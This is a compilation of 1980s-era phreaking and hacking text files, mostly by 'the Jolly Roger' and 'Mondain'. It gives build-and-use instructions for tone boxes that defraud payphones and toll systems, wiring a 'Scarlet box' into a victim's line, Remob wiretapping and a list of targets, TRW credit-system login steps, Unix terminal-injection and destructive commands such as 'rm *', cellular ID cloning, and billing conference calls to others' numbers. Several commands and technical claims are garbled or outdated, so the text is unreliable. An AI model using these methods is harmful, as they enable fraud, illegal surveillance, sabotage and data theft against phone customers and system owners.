         that these ports connected to via these addresses are not 
         limited to PC-Pursuiters.  You can, however, fight "dead" 
         dialout modems in cities via the address method.  Dead modems 
         can be located in about 10 seconds (faster than Telenet), and 
         can either be reported or skipped past by the user connecting 
         to the next modem in the sequence after the "dead" one. 
         (Note: Say 2011.3 is dead, connect to 2011.4 and you will be 
         past it.  If 2011.4 is busy, go to 2011.5.  The reader should 
         notice 2011.3 is the same as 2011C.) 
              The most interesting value of these addresses is that 
         one can count the number of ports that Telenet keeps so 
         secret (Grin).  When there were only 28 cities in operation 
         there were an average of 2.7 300 baud, 9.4 1200 baud, and 2.5 
         2400 baud modems in each city.  Some cities had as little as 
         2 modems on a port and as many as 12.  Only recently has the 
         number of modems per city begun to jump. 
         How To Update The Count Yourself: 
         ================================= 
              An ID is not required to "request" one of these ports, 
         thus the tallying can be done any time of day by simply 
         typing the number at the @ prompt.  Here is an example with 
         four modems (NJNEW/24): 
         @20122.1 
         201 22A REFUSED COLLECT CONNECTION 19 80 
         @20122.2 
         201 22B REFUSED COLLECT CONNECTION 19 80 
         @20122.3 
         201 22C REFUSED COLLECT CONNECTION 19 80 
         @20122.4 
         201 22D REFUSED COLLECT CONNECTION 19 80 
         @20122.5 
         201 22E ILLEGAL ADDRESS 19 80 
         The reader should be aware that PC-Pursuit ports always 
         respond with '19 80'.  Do not confuse it with '19 00', which 
         are not PC-Pursuit ports.  In the above example we know there 
         are four ports because the forth was the last existing port 
         before we encountered the 'ILLEGAL ADDRESS.'  There are 
         several ways to signify that you have gone one beyond the end 
         of the ports: 
            1)  xxx xxx ILLEGAL ADDRESS 19 80 
            2)  xxx xxx NOT OPERATING 19 80 
            3)  The request freezes (Note: Issue a BREAK then D <C/R> 
                to abort the attempt yielding 'ATTEMPT ABORTED'.) 
         You should be aware that modems which are out of order in the
         middle of the sequence can respond with 'NOT OPERATING' or 
         may freeze the request.  You should also note that when 
         updating the existing list, all you need to do is try to 
         request the next modem beyond the end as of the last check. 
         Finding Newly Added Ports: 
         ========================== 
              Many ports have not yet been installed; hence, we do not 
         yet know the addresses.  New ports may be found by entering 
         the first three digits of the area code and appending (1-29, 
         101-129, 201-229, 301-329, etc.) until the 'REFUSED COLLECT 
         CONNECTION 19 80' appears.  Once this is found, simply log 
         onto the port address with your ID and R/V dial some silly 
         series of digits, disconnect the port, then connect to the 
         PC-Pursuit mnemonic you think it might be and R/V redial the 
         last number.  If the numbers match, you found it. 



Pearl Box Plans                                  by the Jolly Roger

The Pearl Box:Definition - This is a box that may substitute for many boxes
which produce tones in hertz. The Pearl Box when operated correctly can
produce tones from 1-9999hz. As you can see, 2600, 1633, 1336 and other
crucial tones are obviously in its sound spectrum.

Materials you will need in order to build The Pearl Box:
========================================================
C1, C2:.5mf or .5uf ceramic disk
       capacitors
Q1.....NPN transistor (2N2222 works
       best)
S1.....Normally open momentary SPST
       switch
S2.....SPST toggle switch
B1.....Standard 9-Volt battery
R1.....Single turn, 50k potentiometer
R2.....  "     "    100k potentiometer
R3.....  "     "    500k potentiometer
R4.....  "     "    1meg potentiometer
SPKR...Standard 8-ohm speaker
T1.....Mini transformer (8-ohm works
       best)
Misc...Wire, solder, soldering iron, PC
       board or perfboard, box to
       contain the completed unit,
       battery clip

Instructions for building Pearl Box:
======================================
Since the instruction are EXTREMELY difficult to explain in words, you will
be given a schematic instead. It will be quite difficult to follow but try
it any way.

Now that you are probably thoroughly confused, let me explain a few

Correct operation of The Pearl Box:
===================================
You may want to get some dry-transfer decals at Radio Shack to make this
job a lot easier. Also, some knobs for the tops of the potentiometers
may be useful too. Use the decals to calibrate the knobs. R1 is the knob
for the ones place, R2 is for the tens place, R3 if for the hundreds
place and R4 is for the thousands place. S1 is for producing the all the
tones and S2 is for power. 
Step 1: Turn on the power and adjust the knobs for the desired tone.
       (Example: For 2600 hz-
         R1=0:R2=0:R3=6:R4=2)
Step 2: Hit the pushbutton switch and VIOLA! You have the tone. If 
you don't have a tone recheck all connections and schematic.

Red boxing is simulating the tones produced by public payphones when you
drop your money in. The tones are beeps of 2200 Hz + 1700 Hz
Nickle = 1 beep for 66 milliseconds.
Dime = 2 beeps, each 66 milliseconds with a 66 millisecond pause between
beeps.
Quarter = 5 beeps, each 33 milliseconds with a 33 millisecond
pause between beeps.

There are two commonly used methods being used by Phreaks to make free calls.
1. An electronic hand-held device that is made from a pair of Wien-bridge
oscillators with the timing controlled by 555 timing chips.
2. A tape recording of the tones produced by a home computer. One of
the best computers to use would be an Atari ST. It is one of the easier
computers to use because the red box tones can be produced in basic with only
about 5 statments.

[__RemObS_________________________]             by the Jolly Roger

Some of you may have heard of devices called Remobs which stands
for Remote Observation System. These Devices allow supposedly
authorized telephone employees to dial into them from anywhere, and
then using an ordinary touch tone fone, tap into a customer's line
in a special receive only mode. [The mouthpiece circuit is
deactivated, allowing totally silent observation from any
fone in the world (Wire tapping without a court order is against
the law)]

[__How Remobs Work______________]
Dial the number of a Remob unit.  Bell is rumored to put them in the
555 information exchanges, oron special access trunks 
[Unreachable except via blue box].  A tone will then be heard
for approximately 2 seconds and then silence.  You must key in
(In DTMF) a 2 to 5 digit access code while holding each digit down
at least 1 second.  If the code is not entered within 5 or 6 seconds,
the Remob will release and must be dialed again.  If the code is
supposedly another tone will be heard.  A seven digit subscriber
fone number can then be entered [The Remob can only handle certain
'exchanges' which are prewired, so usually one machine cannot
monitor an entire NPA].  The Remob will then connect to the
subscribers line.  The listener will hear the low level idle tone
as long as the monitored party is on hook.  As the monitored party
dials [rotary or DTMF], the listener would hear [And Record]
the number being dialed.  Then the ENTIRE conversation, datalink,
whatever is taking place,  all without detection.  There is no
current box which can detect Remob observation, since it is being done
with the telephone equipment that makes the connection.  When the
listener is finished monitoring of that particular customer,  he keys
the last digit of the access code to disconnects him from the
monitored line and return to the tone so that he can key in another
7 digit fone #.  When the listener is totally finished with the Remob,
he keys a single 'disconnect digit' which disconnects him from the
Remob so that the device can reset and be ready for another caller.

[_History of Remobs_______________]
     Bell has kept the existance of Remobs very low key.  Only in
1974, Bell acknowledged that Remobs existed.  The device was
first made public during hearings on "Telephone Monitoring Practices
by Federal Agencies" before a subcommittee on government
operations.  House of Representatives, Ninety-Third Congress, June
1974. 
It has since been stated by Bell that the Remob devices
are used exclusively for monitoring Bell employees such as operators,
information operators, etc., to keep tabs on their performance.
[Suuureee, were stupid]

[__Possible Uses for Remobs__]
     The possible uses of Remobs are almost as endless as the uses
of self created fone line.  Imagine the ability to monitor bank lines
etc, just off the top of my head I can think of these applications:

     Data Monitoring of:
TRW
National Credit Bureau
AT&T Cosmos
Bank Institutions
Compuserve and other Networks.
     Voice Monitoring of:
Bank Institutions
Mail Order buisnesses.
Bell Telephone themselves.
Any place handling sensitive or important information.
Anyone that you may not like.

     With just one Remob, someone could get hundreds of credit cards,
find out who was on vacation, get compuserve passwords by the dozens,
disconnect peoples fones, do credit checks, find out about anything
that they may want to find out about.  Im sure you brilliant
can see the value of a telephone hobbiest and a telecommunications
enthusist getting his hands on a few choice Remobs. <Grin>

[_Caution________________________]
   If any reader should discover a Remob during his (or her) scanning
excursions,  please keep in mind the very strict federal laws
regarding wiretapping and unauthorized use of private Bell property.

   The purpose of a Scarlet box is to create a very bad conection,
it can be used to crash a BBS or just make life miserable for those you
seek to avenge.
Materials: 2 alligator clips, 3 inch wire, or a resister
(plain wire will create greatest amount of static)
(Resister will decrease the amount of static in porportion to 
the resister you are using)

Step (1): Find the phone box at your victims house, and pop the cover off.
Step (2): Find the two prongs that the phone line you wish to box are
connected to.
Step (3): Hook your alligator clips to your (wire/resister).
Step (4): Find the lower middle prong and take off all wires connected to
it, i think this disables the ground and call waiting and shit like that.
Step (5): Now take one of the alligator clips and attach it to the upper
most prong, and take the other and attach it to the lower middle prong.
Step (6): Now put the cover back on the box and take off!!

Silver Box Plans                                 by the Jolly Roger

Introduction:
------------
     First a bit of Phone Trivia. A standard telephone keypad has 12 buttons.
These buttons, when pushed, produce a combination of two tones. These tones
represent the row and column of the button you are pushing.
            1   1   1
            2   3   4
            0   3   7
            9   6   7
     697   (1) (2) (3)
     770   (4) (5) (6)
     851   (7) (8) (9)
     941   (*) (0) (#)
So (1) produces a tone of 697+1209, (2) produces a tone of 697+1336, etc.

Function:
--------
     What the Silver Box does is just creates another column of buttons,
with the new tone of 1633. These buttons are called A, B, C, and D.

Usefulness:
----------
     Anyone who knows anything about phreaking should know that in the
old days of phreaking, phreaks used hardware to have fun instead of other
people's Sprint and MCI codes. The most famous (and useful) was the good
ol' Blue Box. However, Ma Bell decided to fight back and now most phone systems
have protections against tone-emitting boxes. This makes boxing just
about futile in most areas of the United States (ie those areas with Crossbar
or Step-By-Step). If you live in or near a good-sized city, then your phone
system is probably up-to-date (ESS) and this box (and most others)
will be useless. However, if you live in the middle of nowhere (no offense
intended), you may find a use for this and other boxes.

Materials:
---------
     1  Foot of Blue Wire
     1  Foot of Grey Wire
     1  Foot of Brown Wire
     1  Small SPDT Switch (*)
     1  Standard Ma Bell Phone
(*) SPDT = Single Pole/Double Throw

Tools:
-----
     1  Soldering Iron
     1  Flat-Tip Screwdriver

Procedure:
---------
(1) Loosen the two screws on the bottom of the phone and take the casinf off.
(2) Loosen the screws on the side of the keypad and remove the keypad from
the mounting bracket.
(3) Remove the plastic cover from the keypad.
(4) Turn the keypad so that *0# is facing you. Turn the keypad over. You'll see
a bunch of wires, contacts, two Black Coils, etc.
(5) Look at the Coil on the left. It will have five (5) Solder Contacts
facing you. Solder the Grey Wire to the fourth Contact Pole from the left.
(6) Solder the other end of the Grey Wire to the Left Pole of the SPDT Switch.
(7) Find the Three (3) Gold-Plated Contacts on the bottom edge of the keypad.
On the Left Contact, gently seperate the two touching Connectors (they're
soldered together) and spread them apart.
(8) Solder the Brown Wire to the Contact farthest from you, and solder the
other end to the Right Pole of the SPDT Switch.
(9) Solder the Blue Wire to the Closest Contact, and the other end to the
Center Pole of the SPDT Switch.(10) Put the phone back together.

Using The Silver Box:
--------------------
     What you have just done was installed a switch that will change
the 369# column into an ABCD column. For example, to dial a 'B', switch
to Silver Box Tones and hit '6'.
     Noone is sure of the A, B, and C uses. However, in an area with an
old phone system, the 'D' button has an interesting effect. Dial Directory
Assistance and hold down 'D'. The phone will ring, and you
should get a pulsing tone. If you get a pissed-off operator, you have a
newer phone system with defenses against Silver Boxes.
At the pulsing tone, dial a 6 or 7. These are loop ends.

Bell Trashing                                   by the Jolly Roger

     The Phone Co. will go to extreams on occasions. In fact, unless
you really know what to expect from them, they will suprise the heck
out of you with their "unpublished tarriffs". Recently, a situation
was brought to my attention that up till then I had been totaly
unaware of, least to mention, had any concern about. It involved gar-
bage! The phone co. will go as far as to prosecute anyone who rumages
through their garbage and helps himself to some
     Of course, they have their reasons for this, and no doubt benefit
from such action. But, why should they be so picky about garbage? The
answer soon became clear to me: those huge metal bins are filled up
with more than waste old food and refuse... Although it is Pacific
Tele. policy to recycle paper waste products, sometimes employees do
overlook this sacred operation when sorting the garbage.  Thus
top-secret confidential Phone Co. records go to the garbage bins
instead of the paper shredders. Since it is constantly being updated
with "company memorandums, and supplied with extensive reference
material, the Phone co. must continualy dispose of the outdated
materials. Some phone companies are supplied each year with the
complete "System Practices" guide. This publication is an over 40
foot long library of reference material about everything to do with
telephones. As the new edition arrives each year, the old version of
"System Practices" must also be thrown out.
    I very quickly figured out where some local phone phreaks were
getting their material. They crawl into the garbage bins and remove
selected items that are of particular interest to them and their
fellow phreaks. One phone phreak in the Los Angeles area has salvaged
the complete 1972 edition of "Bell System Practices". It is so large
and was out of order (the binders had been removed) that it took him
over a year to sort it out and create enough shelving for it in his
garage.
     Much of this "Top Secret" information is so secret that most phone
companies have no idea what is in their files. They have their hands
full simply replacing everything each time a change in wording
requires a new revision. It seems they waste more paper than they can
read!
     It took quite a while for Hollywood Cal traffic manager to figure
out how all of the local phone phreaks constantly discovered the
switchroom test numbers
     Whenever someone wanted to use the testboard, they found the local
phone phreaks on the lines talking to all points all over the world.
It got to the point where the local garbage buffs knew more about the
office operations than the employees themselves. One phreak went so
far as to call in and tell a switchman what his next daily assignment
would be. This, however, proved to be too much. The switchman
traced the call and one phone phreak was denied the tool of his trade.
     In another rather humorous incident, a fellow phreak was rumaging
through the trash bin when he heard somone apraoching. He pressed up
against the side of the bin and silently waited for the goodies to
come. You can imagine his surprise when the garbage from the lunchroom
landed on his head. Most people find evenings best for checking out
their local telco trash piles. The only thing necessary is a
flashlight and, in the case mentioned above, possibly a rain coat. A
word of warning though, before you rush out and dive into the trash
heap. It is probably illegal, but no matter where you live, you
certainly won't get the local policeman to hold your flashlight for
you.

Hacking TRW                                      by the Jolly Roger

    When you call TRW, the dial up will identify itself with the message "TRW".
It will then wait for you to type the appropiate answer back (such as CTRL-G)
 Once This has been done, the system will say "CIRCUIT BUILDING IN PROGRESS"
Along with a few numbers. After this, it clears the screen
(CTRL  L) followed by a CTRL-Q. After the system sends the CTRL-Q, It is
ready for the request. You first type the 4 character identifyer for the
geographical area of the account..

(For Example) TCA1 - for certain Calif. & Vicinity subscribers. 
TCA2 - A second CALF. TRW System. 
TNJ1 - Their NJ Database. 
TGA1 - Their Georgia Database.

The user then types A <CR> and then on the next line, he must type
his 3 char. Option. Most Requests use the RTS option.
OPX, RTX, and a few others exist. (NOTE) TRW will accept an A, C,
or S as the 'X' in the options above.) Then finally, the user types his 7
digit subscriber code. He appends his 3-4 character password after it.  It
seems that if you manage to get hold of a TRW Printout (Trashing at Sears,
Saks, ETC. or from getting your credit printout from them) Their subscriber
code will be on it leaving only a 3-4 character p/w up to you.

For Example,
(Call the DialUp)
TRW  System Types, ST) CTRL-G 
(You type,YT) Circuit building in progress 1234 
(ST) CTRL-L CRTL-Q (TCA1 CYT) BTS 3000000AAA
<CR><CRTL-S> (YT]
Note: This sytem is in Half Duplex, Even Parity, 7 Bits per word and
2 Stop Bits.

CAUTION: It is a very stressed rumor that after typing in the TRW
password Three (3) times.. It sets an Automatic Number Identification on your
ass, so be careful. And  forget who told you how to do this..

Hacking Vax's & Unix                             by the Jolly Roger

    Unix is a trademark of At&t (and you know what that means)

_______________________________________
In this article, we discuss the unix system that runs on
the various vax systems.  If you are on another unix-type system, some
commands may differ, but since it is licenced to bell, they can't make many
changes.
_______________________________________
Hacking onto a unix system is very difficult, and in this case, we advise
having an inside source, if possible. The reason it is difficult to hack a
vax is this:  Many vax, after you get a carrier from them, respond=>
Login:
They give you no chance to see what the login name format is.  Most commonly
used are single words, under 8 digits, usually the person's name.  There is
a way around this:  Most vax have an acct. called 'suggest' for people to
use to make a suggestion to the system root terminal.  This is usually watched
by the system operator, but at late he is probably at home sleeping or
screwing someone's brains out.  So we can write a program to send at the
vax this type of a message:
A screen freeze (Cntrl-s), screen clear (system dependant), about 255
garbage characters, and then a command to create a login acct., after which
you clear the screen again, then unfreeze the terminal.  What this does:
When the terminal is frozen, it keeps a buffer of what is sent.  well, the
buffer is about 127 characters long. so you overflow it with trash, and then
you send a command line to create an acct. (System dependant).  after this
you clear the buffer and screen again, then unfreeze the terminal.  This is
a bad way to do it, and it is much nicer if you just send a command to
the terminal to shut the system down, or whatever you are after...
There is always, *Always* an acct. called root, the most powerful acct.
to be on, since it has all of the system files on it.  If you hack your
way onto this one, then everything is easy from here on...
On the unix system, the abort key is the Cntrl-d key.  watch how many times
you hit this, since it is also a way to log off the system!
A little about unix architechture: The root directory, called root, is
where the system resides.  After this come a few 'sub' root directories,
usually to group things (stats here, priv stuff here, the user log here...).
Under this comes the superuser (the operator of the system), and then
finally the normal users.  In the unix 'Shell' everything is treated the same.
By this we mean:  You can access a program the same way you access a user
directory, and so on.  The way the unix system was written, everything,
users included, are just programs belonging to the root directory.  Those
of you who hacked onto the root, smile, since you can screw everything...
the main level (exec level) prompt on the unix system is the $, and if you
are on the root, you have a # (superuser prompt).
Ok, a few basics for the system... To see where you are, and what paths
are active in regards to your user account, then type
=> pwd
This shows your acct. seperated by a slash with another pathname (acct.),
possibly many times. To connect through to another path,
or many paths, you would type:
You=> path1/path2/path3
and then you are connected all the way from path1 to path3.  You can
run the programs on all the paths you are connected to.  If it does
not allow you to connect to a path, then you have insufficient privs, or
the path is closed and archived onto tape.  You can run programs this way
also:
you=> path1/path2/path3/program-name
Unix treats everything as a program, and thus there a few commands to
learn...
To see what you have access to in the end path, type=>
ls
for list.  this show the programs you can run.  You can connect to
the root directory and run it's programs with=>
/root
By the way, most unix systems have their log file on the root, so you
can set up a watch on the file, waiting for people to log in and snatch their
password as it passes thru the file. To connect to a directory, use the
command:
=> cd pathname  This allows you to do what you want
with that directory.  You may be asked for a password, but this is a good
ay of finding other user names to hack onto.
The wildcard character in unix, if you want to search down a path for
a game or such, is the *.
=> ls /*
Should show you what you can access. The file types are the same as they
are on a dec, so refer to that section when examining file.  To see what is
in a file, use the
=> pr
filename command, for print file.
We advise playing with pathnames to get the hang of the concept.  There
is on-line help available on most systems with a 'help' or a '?'.
We advise you look thru the help files and pay attention to anything
they give you on pathnames, or the commands for the system.
You can, as a user, create or destroy directories on the tree beneath you.
This means that root can kill everything but root, and you can kill any
that are below you.  These are the
=> mkdir pathname
=> rmdir pathname
commands.
Once again, you are not alone on the system... type=> 
who
to see what other users are logged in to the system at the time.  If you
want to talk to them=>
write username 
Will allow you to chat at the same time, without having to worry
about the parser.  To send mail to a user, say
=> mail
And enter the mail sub-system. To send a message to all the users
on the system, say
=> wall
Which stands for 'write all'. By the way, on a few systems,
all you have to do is hit the <return> key to end the message,
but on others you must hit the cntrl-d key.
To send a single message to a user, say
=> write username
this is very handy again!  If you send the sequence of characters discussed
at the very beginning of this article, you can have the super-user terminal do
tricks for you again. 

Privs:
If you want superuser privs, you can either log in as root, or edit your
acct. so it can say
=> su
this now gives you the # prompt, and allows you to completely by-pass the
protection.  The wonderful security conscious developers at bell made it
very difficult to do much without privs, but once you have them, there
is absolutely nothing stopping you from doing anything you want to.
To bring down a unix system:
=> chdir /bin
=> rm *
this wipes out the pathname bin, where all the system maintenance files are.
Or try:
=> r -r
This recursively removes everything from the system except the remove
command itself.
Or try:
=> kill -1,1
=> sync
This wipes out the system devices from operation.
When you are finally sick and tired from hacking on the vax systems, just
hit your cntrl-d and repeat key, and you will eventually be logged out.

The BLAST Box                                 Courtesy of the Jolly Roger

Ever want to really make yourself be heard? Ever talk to someone on the phone
who just doesn't shut up? Or just call the operator and pop her eardrum? Well,
up until recently it has been impossible for you to do these things. That is,
unless of course you've got a blast box. All a blast box is, is a really cheap
amplifier, (around 5 watts or so) connected in place of the microphone on your
telephone. It works best on model 500 AT&T Phones, and if constructed small
enough, can be placed inside the phone.

Construction:

Construction is not really important. Well it is, but since I'm letting you make
your own amp, I really don't have to include this.

Usage:

Once you've built your blast box, simply connect a microphone (or use the
microphone from the phone) to the input of the amplifier, and presto. There it
is. Now, believe it or not, this device actually works. (At least on crossbar.)
It seems that Illinois bell switching systems allow quite alot of current to
pass right through the switching office, and out to whoever you're calling. When
you talk in the phone, it comes out of the other phone (again it works best if
the phone that you're calling has the standard western electric earpiece)
incredibly loud. This device is especially good for PBS Subscription drives.
Have "Phun", and don't get caught!

---- Compiled by: Mondain------               Dealing with the Rate & Route Operator         


        It seems that fewer and fewer people have blue boxes
these days, and that is really too bad.  Blue boxes, while not
all that great for making free calls (since the TPC can tell when
the call was made, as well as where it was too and from), are
really a lot of fun to play with.  Short of becoming a real live
TSPS operator, they are about the only way you can really play
with the network.

        For the few of you with blue boxes, here are some phrases
which may make life easier when dealing with the rate & route
(R&R) operators.  To get the R&R op, you send a KP + 141 + ST.
In some areas you may need to put another NPA before the 141
(i.e., KP + 213 + 141 + ST), if you have no local R&R ops.

        The R&R operator has a myriad of information, and all it
takes to get this data is mumbling cryptic phrases.  There are
basically four special phrases to give the R&R ops.  They are
NUMBERS route, DIRECTORY route, OPERATOR route, and PLACE NAME.

        To get an R&R an area code for a city, one can call the
R&R operator and ask for the numbers route.  For example, to find
the area code for Carson City, Nevada, we'd ask the R&R op for
"Carson City, Nevada, numbers route, please." and get the answer,
"Right... 702 plus." meaning that 702 plus 7 digits gets us
there.
        Sometimes directory assistance isn't just NPA + 131. The
way to get these routings is to call R&R and ask for "Anaheim,
California, directory route, please." Of course, she'd tell us it
was 714 plus, which means 714 + 131 gets us the D.A. op there.
This is sort of pointless example, but I couldn't come up with a
better one on short notice.

        Let's say you wanted to find out how to get to the inward
operator for Sacremento, California.  The first six digits of a
number in that city will be required (the NPA and an NXX).  For
example, let us use 916 756. We would call R&R, and when the
operator answered, say, "916 756, operator route, please." The
operator would say, "916 plus 001 plus."  This means that 916
+ 001 + 121 will get you the inward operator for Sacramento. Do
you know the city which corresponds to 503 640?  The R&R operator
does, and will tell you that it is Hillsboro, Oregon, if you
sweetly ask for "Place name, 503 640, please."

        For example, let's say you need the directory route for
Sveg, Sweden. Simply call R&R, and ask for, "International,
Baden, Switzerland. TSPS directory route, please."  In response
to this, you'd get, "Right... Directory to Sveg, Sweden.  Country
code 46 plus 1170."  So you'd route yourself to an
international sender, and send 46 + 1170 to get the D.A. operator
in Sweden.

        Inward operator routings to various countries are
obtained the same way "International, London, England, TSPS
inward route, please." and get "Country code 44 plus 121."
Therefore, 44 plus 121 gets you inward for London.
        Inwards can get you language assitance if you don't speak
the language. Tell the foreign inward, "United Staes calling.
Language assitance in completing a call to (called party) at
(called number)."
        R&R operators are people are people too, y'know.  So
always be polite, make sure use of 'em, and dial with care.


-----------MondainCellular Phreaking                         courtesy of The  Jolly Roger

     The cellular/mobile phone system is one that is perfectly set up to be
exploited by phreaks with the proper knowledge and equipment.  Thanks to
deregulation, the regional BOC's (Bell Operating Companies) are scattered
and do not communicate much with each other.  Phreaks can take advantage of
this by pretending to be mobile phone customers whose "home base" is a city
served by a different BOC, known as a "roamer".  Since it is impractical
for each BOC to keep track of the customers of all the other BOC's, they
will usually allow the customer to make the calls he wishes, often with a
surcharge of some sort.

The bill is then forwarded to the roamer's home BOC for collection.
However, it is fairly simple (with the correct tools) to create a bogus ID
number for your mobile phone, and pretend to be a roamer from some other
city and state, that's "just visiting".  When your BOC tries to collect for
the calls from your alleged "home BOC", they will discover you are not a
real customer; but by then, you can create an entirely new electronic
identity, and use that instead. 
    How does the cellular system know who is calling, and where they are?
When a mobile phone enters a cell's area of transmission, it transmits its
phone number and its 8 digit ID number to that cell, who will keep track of
it until it gets far enough away that the sound quality is sufficiently
diminished, and then the phone is "handed off" to the cell that the customer
has walked or driven into.  This process continues as long as the phone has
power and is turned on.  If the phone is turned off (or the car is), someone
attempting to call the mobile phone will receive a recording along the
lines of "The mobile phone customer you have dialed has left the vehicle
or driven out of the service area."   When a call is made to a mobile phone,
the switching equipment will check to see if the mobile phone being called is
"logged in", so to speak, or present in one of the cells.  If it is, the
call will then act (to the speaking parties) just like a normal call - the
caller may hear a busy tone, the phone may just ring, or the call may be
answered. 
    How does the switching equipment know whether or not a particular
phone is authorized to use the network?  Many times, it doesn't.  When a
dealer installs a mobile phone, he gives the phone's ID number (an 8 digit
hexadecimal number) to the local BOC, as well as the phone number the BOC
assigned to the customer.  Thereafter, whenever a phone is present in one
of the cells, the two numbers are checked - they should be registered to
the same person.  If they don't match, the telco knows that an attempted
fraud is taking place (or at best, some transmission error) and will not
allow calls to be placed or received at that phone.  However, it is
impractical (especially given the present state of deregulation) for the
telco to have records of every cellular customer of every BOC.  Therefore,
if you're going to create a fake ID/phone number combination, it will need
to be "based" in an area that has a cellular system (obviously), has a
different BOC than your local area does, and has some sort of a "roamer"
agreement with your local BOC.

   How can one "phreak" a cellular phone?  There are three general areas
when phreaking cellular phones; using one you found in an unlocked car
(or an unattended walk-about model), modifying your own chip set to look
like a different phone, or recording the phone number/ID number combinations
sent by other local cellular phones, and using those as your own.  Most
cellular phones include a crude "password" system to keep unauthorized
users from using the phone - however, dealers often set the password 
(usually a 3 to 5 digit code) to the last four digits of the customer's
mobile phone number.  If you can find that somewhere on the phone, you're
in luck.  If not, it shouldn't be TOO hard to hack, since most people
aren't smart enough to use something besides "1111", "1234", or whatever.
If you want to modify the chip set in a cellular phone you bought
(or stole), there are two chips (of course, this depends on the model and
manufacturer, yours may be different) that will need to be changed - one
installed at the manufacturer (often epoxied in) with the phone's ID
number, and one installed by the dealer with the phone number, and possible
the security code.  To do this, you'll obviously need an EPROM burner
as well as the same sort of chips used in the phone (or a friendly and
unscrupulous dealer!).  As to recording the numbers of other mobile phone
customers and using them; as far as I know, this is just theory... but it
seems quite possible, if you've got the equipment to record and decode it.
The cellular system would probably freak out if two phones (with valid
ID/phone number combinations) were both present in the network at once,
but it remains to be seen what will happen.

     How To:
     -------

       After you find the number to the intercept operator in
your prefix, use your call-forwarding and forward all calls to
her...this will make your phone stay off the hook(actually, now
it waits for a quarter to be dropped in)...you now have a cheese
box... In Order To Call Out On This Line:You must use your Red
Box tones and generate the quarter dropping in...then,you can
make phone calls to people...as far as I know, this is fairly
safe, and they do not check much...Although I am not sure, I
think you can even make credit-card calls from a cheesebox
phone and not get traced...

FIRSTLY, THE FONE COMPANY HAS WHAT IS CALLED SWITCHING SYSTEMS.  THERE ARE SE
VERAL TYPES, BUT THE ONE WE WILL CONCERN OURSELVES WITH, IS ESS (ELECTRONIC
SWITCHING SYSTEM).  IF YOUR AREA IS ZONED FOR ESS, DO NOT START A CONFERENCE
CALL VIA THE 2600 HZ. TONE, OR BELL SECURITY WILL NAIL YOUR ASS!  TO FND OUT IF
YOU ARE UNDER ESS, CALL YOUR LOCAL BUSINESS OFFICE, AND ASK THEM IF YOU CAN GET
CALL WAITING/FORWARDING, AND IF YOU CAN, THAT MEANS THAT YOU ARE IN ESS COUNTRY
, AND CONFERENCE CALLING IS VERY, VERY DANGEROUS!!! NOW, IF YOU ARE NOT IN ESS,
YOU WILL NEED THE FOLLOWING EQUIPMENT:

  AN APPLE CAT II MODEM
  A COPY OF TSPS 2 OR CAT'S MEOW
  A TOUCH TONE FONE LINE
  AND A TOUCH TONE FONE. (TRUE TONE)

NOW, WITH TSPS 2, DO THE FOLLOWING:

 RUN TSPS 2
 CHOSE OPTION 1
 CHOSE OPTION 6
 CHOSE SUB-OPTION 9

  NOW TYPE:

 1-514-555-1212 (DASHES ARE NOT NEEDED)

LISTEN WITH YOUR HANDSET, AND AS SOON AS YOU HEAR A LOUD 'CLICK', THEN TYPE

 $

TO GENERATE THE 2600 HZ. TONE.  THIS OBNOXIOUS TONE WILL CONTINUE FOR A FEW
SECONDS, THEN LISTEN AGAIN AND YOU SHOULD HEAR ANOTHER LOUD 'CLICK'.

 NOW TYPE:

 KM2130801050S

WHERE 'K' = KP TONE
      'M' = MULTI FREQUENCY MODE
      'S' = S TONE

NOW LISTEN TO THE HANDSET AGAIN, AND WAIT UNTIL YOU HEAR THE 'CLICK' AGAIN.
THEN TYPE:

  KM2139752975S

WHERE 2139751975 IS THE NUMBER TO BILL THE CONFERENCE CALL TO. NOTE: 213-975-
1975 IS A DISCONNECTED NUMBER, AND I STRONGLY ADVISE THAT YOU ONLY BILL THE
CALL TO THIS NUMBER, OR THE FONE COMPANY WILL FIND OUT, AND THEN..........
REMEBER, CONFERENCE CALLS ARE ITEMIZED, SO IF YOU DO BILL IT TO AN ENEMY'S NUMB
ER, HE CAN EASILY FIND OUT WHO DID IT AND HE CAN BUST YOU!

YOU SHOULD NOW HEAR 3 BEEPS, AND A SHORT PRE-RECORDED MESSAGE.  FROM HERE ON,
EVERYTHING IS ALL MENU DRIVEN.

STAY AWAY FROM 7 AND 9!  IF FOR SOME REASON AN OPERATOR GETS ON-LINE,
HANG UP! IF YOU GET A BUSY SIGNAL AFTER KM2130801050S, THAT MEANS THAT THE

HOW TO BUILD IT
_______________


     You will need the following:

Two 10K OHM and three 1.4K OHM resistors
Two 2N3904 transistors
Two Photo Cells
Two Red LED'S (The more light produced the better)
A box that will not let light in
Red and Green Wire

Light from the #1 LED must shine directly on the photocell #1. The gold
box I made needed the top of the LED's to touch the photo cell for it to
work.

The same applies to the #2 photo cell and LED.

The 1.4K resistor is variable and if the second part of the gold box is 
skipped it will still work but when someone picks up the phone they will
hear a faint dial tone in the background and might report it to the 
Gestapo er...(AT&T). 
1.4K will give you good reception with little risk of a Gestapo agent at 
your door.

    
Now that you have built it take two green wires of the same length and
strip the ends, twist two ends together and connect them to green1 and
place a piece of tape on it with "line #1" writing on it.

Continue the process with red1 only use red wire. Repeat with red2 and 
green2 but change to line #2.





HOW TO INSTALL
______________

You will need to find two phone lines that are close together. Label one of
teh phone lines "Line #1". Cut the phone lines and take the outer coating
off it. Tere should be 4 wires. Cut the yellow and black wires off and
strip the red and green wires for both lines.

Line #1 should be in two pieces. Take the green wire of one end and connect 
it to one of the green wires on the gold box. Take the other half of line
#1 and hook the free green wire to the green wire on the phone line. Repeat
the process with red1 and the other line.

All you need to do now is to write down the phone numbers of the place you
hooked it up at and go home and call it. You should get a dial tone!!!
If not, try changing the emittor with the collector.


Have a great time with this!            --------Mondain----------


The History of ESS                     Courtesy of the Jolly Roger

   Of all the new 1960s wonders of telephone technology -
satellites, ultra modern Traffic Service Positions (TSPS) for
operators, the picturephone, and so on - the one that gave Bell
Labs the most trouble, and unexpectedly became the greatest
development effort in Bell System's history, was the perfection
of an electronic switching system, or ESS.

   It may be recalled that such a system was the specific end in
view when the project that had culminated in the invention of the
transistor had been launched back in the 1930s. After successful
accomplishment of that planned miracle in 1947-48, further delays
were brought about by financial stringency and the need for
further development of the transistor itself. In the early 1950s,
a Labs team began serious work on electronic switching. As early
as 1955, Western Electric became involved when five engineers
from the Hawthorne works were assigned to collaborate with the
Labs on the project. The president of AT&T in 1956, wrote
confidently, "At Bell Labs, development of the new electronic
switching system is going full speed ahead. We are sure this will
lead to many improvements in service and also to greater
